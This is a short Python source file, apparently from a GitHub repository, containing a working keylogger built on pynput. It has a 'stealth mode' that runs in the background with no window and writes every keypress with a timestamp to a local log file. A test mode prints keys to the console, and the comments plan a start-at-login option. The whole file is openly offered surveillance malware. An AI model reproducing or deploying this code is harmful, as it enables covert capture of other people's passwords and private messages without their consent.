# https://github.com/Donosla/Keylogger
# Dependencies:
# install pynput
from pynput.keyboard import Key, Listener
import logging

print ("\nKeylogger: By Donosla \n Choose an option by entering a Number: \n 1=Invisible/Stealth Mode, 2=Test Mode: ")
select_mode = input()
# test mode prints each keypress to the console window and can use esc key to quit, stealth mode has no gui and works in the background
# add gui option for output dir / name
# add option for start at login, save user settings, if 'dont ask at login' checked in preferences dont ask for user input
stop_logger = False
stealth_mode = '1'
test_mode = '2'
output_dir = "log_output" # leave blank to create the output file in current user dir, otherwise specify the path
output_name = "keylogger_output.txt"
logginginfo = logging.info
logging.basicConfig(filename=(output_dir + output_name), level=logging.DEBUG, format='%(asctime)s: %(message)s')

# press esc then f10 to exit the keylogger in the background
if select_mode == stealth_mode:
    def on_press(key):
        global stop_logger
        logginginfo(str(key))
        # print (key) #for testing purposes
        if key == Key.esc: # press esc to exit the keylogger/stop listener then f10 if in stealth mode
            # print ('esc stop true')
            stop_logger = True
            # return True
        elif stop_logger == True and key == Key.f10:
            # print ('exit')
            return False
            # pynput.keyboard.Listener.stop()
        elif stop_logger == True and key != Key.f10:
            # print ('last')
            stop_logger = False
        else:
            pass          
    with Listener(on_press=on_press) as listener:
        listener.join()

elif select_mode == test_mode:
    def on_press(key):
        logginginfo(str(key))
        print (key) #for testing purposes
        if key == Key.esc: # press esc to exit the keylogger/stop listener
            print ('exiting')
            return False
            # pynput.keyboard.Listener.stop()
    with Listener(on_press=on_press) as listener:
        listener.join()

else:
    print('Error: Please type 1 or 2 into the console to select a mode')
